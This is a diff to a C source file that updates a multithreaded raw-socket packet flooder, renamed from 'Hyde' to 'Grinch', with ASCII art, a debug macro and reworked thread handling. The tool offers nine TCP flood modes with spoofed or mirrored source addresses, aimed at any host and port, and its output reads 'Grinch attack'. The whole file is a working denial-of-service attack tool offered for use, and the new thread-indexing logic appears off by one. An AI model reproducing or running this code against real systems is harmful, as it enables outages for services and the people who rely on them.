@@ -1,5 +1,36 @@
 /*
-        ..::Hyde:NetWork:FlowTest::..
+        ..::Grinch:NetWork:FlowTest::..
+                 __..._                                          
+              ,-`      `',                                        
+            ,'            \
+           /               |   
+         ,'       ,        \
+       ,'       ,/-'`       \
+   _ ./     ,.'`/            \
+.-` `^\_,.'`   /              `\__                                
+7     /       /   _,._,.,_,.-'.`  `\                   (((((((((((((((
+\A  __/   ,-```-``   `,   `,   `  ,`)                      ((((       
+  ^-`    /      `                 ,/                    )))))))))          
+         (        ,   ,_   ,-,_,<`                         (((((((        
+          \__ T--` `''` ```    _,\                      (((((((
+            \_/|\_         ,.-` | |                       ))))         
+            _/ | |T\_   _,'Y    / +--,_                  (((         
+        <```   \_\/_/  `\\_/   /       `\          ______________
+        /  ,--   ` _,--,_`----`   _,,_   \        [______________]
+       /  ` |     <_._._ >       `  \ `  \`        \             |  
+      |     |       ,   `           |     |         \           /   
+       V|   \       |                |   |`          \         /    
+        \    \      /               (================(         )               
+         \x   \_   |             /-`    /             +-------+             
+           \    `-,|        ,/--`     /`                          
+            \x_    \_  /--'`       , /                            
+               \x_   ``        ,,/` `                             
+                  `-,_,-'   ,'`                                   
+                   _|       |`\  
+                  ( `-``/``/`_/     
+                   `-`-,.-.-`                      
+
+coded by
 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░░▓██████▒░▓████░▓████░▓█▒░░░░▓█████▒░▓██████▒░░░░
 ░░▓██▒░░░░░░▓▒░░█░▓▒░░█░▓█▒░░░░▓█▒░░░░░▓█▒░░░█▒░░░░
@@ -22,17 +53,17 @@
   " 7 - PSH+ACK With Spoofing",
   " 8 - XMAS with Mirror Spoofing",
   "ex: ./code www.server.com 80 20000 4 5",
-  "..::Hyde:NetWork:FlowTest::..",
+  "..::Grinch:NetWork:FlowTest::..",
 
- Need RooT to COmpile THis
-  gcc -o hyde2 hyde2.c;
+ Need RooT to COmpile THis z use raw sock
+  gcc -o hyde3 hyde3.c -lpthread; ./hyde3
 
 Author: Cooler_
 E-mail: c00f3r[at]gmail[dot]com
 date: 17/03/2010
 BugSec Security TEAM
 http://code.google.com/p/bugsec/
-thanks: m0nad,_mlk_,IAK,sigsegv,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbone,nibbles,voidpointer,muzgo...
+thanks: m0nad,_mlk_,IAK,sigsegv,b4r0n,MenteBinaria,f117,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbone,nibbles,voidpointer,muzgo...
  
 */
 #include <stdio.h>    
@@ -54,9 +85,31 @@ thanks: m0nad,_mlk_,IAK,sigsegv,delfo,c0lt7r,joey,fokerbug,zepplin,otacon,backbo
 // pthread Header
 #include <pthread.h>
 
+#define BUGVIEW 1
+
+// debug purpoises
+#define DEBUG(x, s...) do { \
+ if (!BUGVIEW) { break; } \
+ time_t t = time(NULL); \
+ char *d = ctime(&t); \
+ fprintf(stderr, "%.*s %s[%d] %s(): ", \
+ (int)strlen(d) - 1, d, __FILE__, \
+ __LINE__, __FUNCTION__); \
+ fprintf(stderr, x, ## s); \
+} while (0);
 
 //Mutex Always is global, because the functions need look him to call
 pthread_mutex_t morfo = PTHREAD_MUTEX_INITIALIZER;
+
+// HEAP alignment :-X
+void *xmalloc(unsigned int len)
+{
+ void *ptr;
+ ptr=malloc(len);
+ if(ptr==NULL) 
+  DEBUG("fail malloc");
+ return ptr;
+}
 
 char *RandomIp(void)
 {     
@@ -68,7 +121,7 @@ char *RandomIp(void)
  r3 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
  r4 = 1+(int) (255.0*rand()/(RAND_MAX+1.0));          
 
- ipRand=malloc(12*sizeof(char *));
+ ipRand=xmalloc(12*sizeof(char *));
  sprintf(ipRand,"%d.%d.%d.%d",r1,r2,r3,r4); 
 
  return ipRand; 
@@ -179,8 +232,6 @@ void *fazerpacote(void *arg)
  struct sockaddr_in sin; 
  unsigned int remetente,destino;
 
- pthread_mutex_lock(&morfo);
-
 // string 2 int
 // if ipv6 AF_INET6
  inet_pton(AF_INET, source_addr, &remetente);
@@ -211,6 +262,10 @@ void *fazerpacote(void *arg)
  envio.tcp.urg_ptr = 0;        
  envio.tcp.window = htons(512);    
  envio.tcp.check = 0;    
+
+// lock
+ pthread_mutex_lock(&morfo);
+
   switch(escolha)
   {
 // XMAS with Spoofing
@@ -344,25 +399,22 @@ void *fazerpacote(void *arg)
    
 void help()
 {
- int c=12;
- char *banner[] = {
-  "follow this:",
-  "./code HOST PORT Number_Packets TYPE Threads",
-  " 0 - XMAS with Spoofing",
-  " 1 - SYN+ACK with Spoofing",
-  " 2 - SYN+ACK with Mirror Spoofing",
-  " 3 - FIN+ACK with Spoofing",
-  " 4 - FIN+ACK with Mirror Spoofing",
-  " 5 - URG+ACK with Spoofing",
-  " 6 - URG+ACK With Mirror Spoofing",
-  " 7 - PSH+ACK With Spoofing",
-  " 8 - XMAS with Mirror Spoofing",
-  "ex: ./code www.server.com 80 20000 4 50",
-  "..::Hyde:NetWork:FlowTest::.. ",
- };
-
- while(c^0)
-  puts(banner[c]),c--;
+ puts(
+  "follow this:"
+  "./code HOST PORT Number_Packets TYPE Threads"
+  " 0 - XMAS with Spoofing"
+  " 1 - SYN+ACK with Spoofing"
+  " 2 - SYN+ACK with Mirror Spoofing"
+  " 3 - FIN+ACK with Spoofing"
+  " 4 - FIN+ACK with Mirror Spoofing"
+  " 5 - URG+ACK with Spoofing"
+  " 6 - URG+ACK With Mirror Spoofing"
+  " 7 - PSH+ACK With Spoofing"
+  " 8 - XMAS with Mirror Spoofing"
+  "ex: ./code www.server.com 80 20000 4 50"
+  "..::Grinch:NetWork:FlowTest::.. "
+  "Coded by Cooler_ c00f3r[at]gmail[dot]com"
+ );
 }
 
 
@@ -372,7 +424,7 @@ int main(int argc, char *argv[])
  char *remetente=NULL,*destino=NULL;
 
  unsigned short port=80;     
- int escolha=0,filhos=0,count=0,max=0;
+ int escolha=0,filhos=0,count=0;
  long long int number=500;
  int8_t rc1;
     
@@ -384,20 +436,35 @@ int main(int argc, char *argv[])
 
  if(!orion_getHostByName(argv[1],IP))
  {
-  puts("orion_gethostbyname() failed");
+  DEBUG("orion_gethostbyname() failed");
   exit(1);
  }
 
-  printf("\nIP: %s \n",IP);
+  fprintf(stdout,"\nIP: %s \n",IP);
      
-  if(argc >= 3) 
-   port = atoi(argv[2]);    
+  if(argc >= 3)
+  { 
+   port = atoi(argv[2]); 
+   if(!(port<=65535&& port>0)) 
+    DEBUG("error in port");
+  }  
   if(argc >= 4) 
    number = atoi(argv[3]);
+
   if(argc >= 5) 
-   escolha = atoi(argv[4]);       
-  if(argc >= 6) 
-   filhos = atoi(argv[5]);         
+  {
+   escolha = atoi(argv[4]);
+   if(escolha<0 || escolha > 8)
+    DEBUG("please choice a true option");
+  }       
+
+  if(argc >= 6)
+  { 
+   filhos = atoi(argv[5]);  
+   if(filhos<=0)
+    DEBUG("set number of threads please");       
+  }
+
   if(filhos<2) 
    filhos = 2;    
     
@@ -406,7 +473,7 @@ int main(int argc, char *argv[])
   fprintf(stdout,"threads         : %u\n",filhos);
   fprintf(stdout,"Number of times: %lld\n\n", number); 
      
-  destino=malloc(sizeof(IP));  
+  destino=xmalloc(sizeof(IP));  
   strncpy(destino,IP, (sizeof(IP)) );
 
   switch(escolha)
@@ -448,44 +515,42 @@ int main(int argc, char *argv[])
      break;
   }  
 
- //thread plan
    pthread_t *thread;
-   thread=(pthread_t *)malloc(sizeof(pthread_t)*filhos+1);
-   char **ThreadArgv;
+   thread=(pthread_t *)xmalloc(sizeof(pthread_t)*filhos+1);
 
-   ThreadArgv=(char **)malloc(4*sizeof(char *));
-   char *StrPort=(char *)malloc(sizeof(char)*6);
+// pack to bypass void pointer
+   char **ThreadArgv;
+   ThreadArgv=(char **)xmalloc(4*sizeof(char *));
+   char *StrPort=(char *)xmalloc(sizeof(char)*6);
    sprintf( StrPort,"%d",  port);
    ThreadArgv[2]=StrPort;
    ThreadArgv[3]=StrPort;
-   char *StrChoice=(char *)malloc(sizeof(char)*3);
+   char *StrChoice=(char *)xmalloc(sizeof(char)*3);
    sprintf( StrChoice,"%d", escolha);
    ThreadArgv[4]=StrChoice;
- 
- while(number^0) 
- {  
-  count=filhos;
 
-    if( (!(escolha&1))&&(escolha^0) )
+  while(number) 
+  {  
+    if( (!(escolha&1))&&(escolha) )
     {
 // packing arguments 2 function
      ThreadArgv[0]=destino;
      ThreadArgv[1]=destino;
-     fprintf(stdout,"Hyde look %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
+     fprintf(stdout,"Grinch attack %s the port %u, spoofing %s in port %u\n", IP, port, IP, port);
 // start thread
-     while(count)
-     {
       if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
-       puts("error in thread 1");
-      count--;
-     }
-    count=filhos;
-// join and re-alloc to join new pthreads
-     while(count)
+       DEBUG("error in thread %d",count);
+     
+     if(count==filhos)
      {
-      pthread_join(thread[count],NULL);
-      count--;
+      while(count)
+      {
+       pthread_join(thread[count],NULL);
+       count--;
+      }
      }
+     number--;
+     count++;
     }
     else
     { 
@@ -493,32 +558,32 @@ int main(int argc, char *argv[])
      remetente=RandomIp();
      ThreadArgv[0]=remetente;
      ThreadArgv[1]=destino;
-     fprintf(stdout,"Hyde look %s in port %u, spoofing %s in port %u\n", destino, port, remetente, port);   
+     fprintf(stdout,"Grinch attack %s in port %u, spoofing %s in port %u\n", destino, port, remetente, port);   
 // start thread
-     while(count)
-     {
       if((rc1=pthread_create(&thread[count],NULL,&fazerpacote,(void *) ThreadArgv)))
-       puts("error in thread 1");
-      count--;
-     }
-    count=filhos;
-// join and re-alloc to join new pthreads
-     while(count)
+       DEBUG("error in thread %d",count);
+     
+     if(count==filhos)
      {
-      pthread_join(thread[count],NULL);
-      count--;
+      while(count)
+      {
+       pthread_join(thread[count],NULL);
+       count--;
+      }
      }
-
+     number--; 
+     count++;   
     }
-   number--;    
-  }
+
+ }
+
  free(thread);
  free(destino);
  free(ThreadArgv);
  free(StrPort);
  free(StrChoice);
  free(remetente);
+
  return 0;
 }    
-
 
